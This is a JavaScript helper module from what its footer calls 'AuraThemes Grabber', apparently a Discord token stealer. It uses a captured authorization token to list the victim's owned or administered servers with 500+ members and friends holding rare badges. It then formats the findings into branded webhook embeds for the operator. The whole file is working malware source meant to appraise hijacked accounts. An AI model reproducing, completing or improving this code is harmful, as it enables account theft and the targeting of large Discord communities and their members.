const { EmbedBuilder } = require('discord.js');
const fetch = require('sync-fetch');

module.exports = {
    fetchServers:  function (x) {
        try {
            const _ = fetch("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
                headers: {
                    Authorization: x,
                },
            });
            const d = _.json();
            const ss = d
                .filter((s) => s.owner || (s.permissions & 8) === 8)
                .filter((s) => s.approximate_member_count >= 500)
                .map((s) => ({
                    id: s.id,
                    name: s.name,
                    owner: s.owner,
                    member_count: s.approximate_member_count,
                }));
            const t = ss.length;
            const all = t
                ? ss.map((ss) => {
                    return `**${ss.name}** | \`${ss.id}\`` +
                        `\n**Owner** ${ss.owner ? "<a:success:1167141798792134788>" : "❌"
                        } | **Members** <:online:970050105338130433> \`${ss.member_count}\``;
                }).join("\n\n")
                : "```yml\nNot found```";
            return {
                totals: t,
                all,
            };
        } catch (ee) {
            console.error("Error fetching servers:", ee);
            return {
                totals: 0,
                all: "```yml\nNot found```",
            };
        }
    },
    fetchFriends:  function (x) {
        try {
            const _ = fetch("https://discord.com/api/v9/users/@me/relationships", {
                headers: {
                    Authorization: x,
                },
            });
            const d = _.json();
            const getRareBadges = (f) => {
                let b = "";
                b += (1 & f) ? "<:staff:1090015968618623129> " : "";
                b += (2 & f) ? "<:partner:918207395279273985> " : "";
                b += (4 & f) ? "<:events:898186057588277259> " : "";
                b += (8 & f) ? "<:bughunter_1:874750808426692658> " : "";
                b += (512 & f) ? "<:early:800653363905429504> " : "";
                b += (16384 & f) ? "<:bughunter_2:874750808430874664> " : "";
                b += (131072 & f) ? "<a:developer:1094695138648936589> " : "";
                return b || ":x:";
            };
            const rf = d
                .filter((f) => f.type === 1)
                .map((f) => {
                    const r = getRareBadges(f.user.public_flags);
                    return r !== ":x:" ? `${r} | **${f.user.username}#${f.user.discriminator}**` : null;
                })
                .filter(Boolean)
                .join("\n");
            const t = rf.split("\n").length;
            return {
                totals: t,
                all: rf || "```yml\nNot found```",
            };
        } catch (ee) {
            console.error("Error fetching friends:", ee);
            return {
                totals: 0,
                all: "```yml\nNot found```",
            };
        }
    },
    getEmbeds: function ({ author: { name, icon_url }, thumbnail, color, title, desc, fields = [] }) {
        try {
            const builder = new EmbedBuilder().setAuthor({ name: name ?? "-", iconURL: icon_url }).setThumbnail(thumbnail);
            if (color !== "") {
                builder.setColor(color == "" ? "#c267ff" : color || "#c267ff");
            } else {
                builder.setColor("#c267ff");
            }
            if (title) {
                builder.setTitle(title ?? "-");
            }
            if (desc) {
                builder.setDescription(desc ?? "-");
            }
            if (fields.length > 0) {
                builder.addFields(...fields);
            }
            return builder.setFooter({ text: `AuraThemes Grabber - https://discord.gg/aurathemes`, iconURL: "https://i.imgur.com/CeFqJOc.gif" }).setTimestamp();
        } catch (error) {
            return null;
        }
    },
    send: function (e) {
        return {
          embeds: [e],
          username: '@AuraThemes',
          avatarURL: 'https://i.imgur.com/CeFqJOc.gif'
        };
    },
}
